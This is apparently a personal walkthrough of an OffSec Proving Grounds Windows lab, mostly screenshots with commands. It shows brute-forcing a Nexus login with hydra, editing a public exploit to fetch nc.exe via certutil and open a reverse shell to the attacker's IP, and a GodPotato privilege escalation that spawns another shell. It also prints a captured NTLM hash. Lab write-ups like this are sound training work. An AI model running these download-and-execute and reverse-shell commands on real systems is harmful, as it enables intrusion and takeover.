---
title: BillyBoss
date: 2026-01-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - ftp
  - macros
  - proving-grounds
categories:
  - Pentesting
  - Windows
  - Offsec
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hepet"
---

![](Screenshot%202025-12-21%20at%2016.18.55.png)

![](Screenshot%202025-12-21%20at%2016.19.50.png)

![](Screenshot%202025-12-21%20at%2016.24.06.png)

`cewl --lowercase http://192.168.160.61:8081/ | grep -v CeWL > wordlists.txt`

`hydra -I -f -L wordlists.txt -P wordlists.txt “http-post-form://192.168.185.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403”`

Now that we have username and password: nexus:nexus

`searchsploit sonatype`

![](Screenshot%202026-01-20%20at%2012.06.56.png)

Change the url, port, username and password in the 49385.py

Change the command

`cmd.exe /c certutil -urlcache -f http://192.168.45.197/nc.exe nc.exe && nc.exe -e cmd 192.168.45.197 1337`

![](Screenshot%202025-12-22%20at%2012.06.38.png)

Start a server and a listener

`python -m http.server 80`

`rlwrap nc -lvnp 1337`

![](Screenshot%202025-12-22%20at%2012.04.41.png)
 
![](Screenshot%202025-12-22%20at%2012.12.02.png)
 ![](Screenshot%202025-12-22%20at%2012.12.32.png)

type: `winpeas`, this will take you to the folder then `python -m http.server 80

`certutil -urlcache -f http://192.168.45.197:81/winPEASany.exe winp.exe`

![](Screenshot%202025-12-22%20at%2012.14.25.png)

![](Screenshot%202025-12-22%20at%2012.15.44.png)

C:\Users\nathan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

![](Screenshot%202025-12-22%20at%2012.19.14.png)

![](Screenshot%202025-12-22%20at%2012.21.52.png)

`C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe`

![](Screenshot%202025-12-22%20at%2012.24.15.png)

nathan::BILLYBOSS:1122334455667788:f4e804d73c9a8ebe26b9e452c4e3540e:010100000000000025316728dd72dc01e125b7b0508a9e4d000000000800300030000000000000000000000000300000aab48063e5416693afca1247690e33e6c4535d6c6eea3ca963eab042ac2ff4950a00100000000000000000000000000000000000090000000000000000000000

Using `systeminfo` I found the windows 10 version 

I just googled: privilege escalation windows 
This one didn't work:
https://www.exploit-db.com/exploits/47684

Do I tried this:
https://github.com/BeichenDream/GodPotato

GodPotato had worked but thought it would give me NT privs. 

![](Screenshot%202025-12-22%20at%2014.00.14.png)

Wasn't sure it had worked but it had.
I just needed to start a new reverse shell. 

I downloaded nc.exe again but into the same folder as GodPotato

`certutil -urlcache -f http://192.168.45.197:81/nc.exe nc.exe`

Run it:

`.\god.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.197 1234"`

![](Screenshot%202025-12-22%20at%2014.04.54.png)

![](Screenshot%202025-12-22%20at%2013.58.46.png)

![](Screenshot%202025-12-22%20at%2013.49.28.png)

This took me around 5 hours.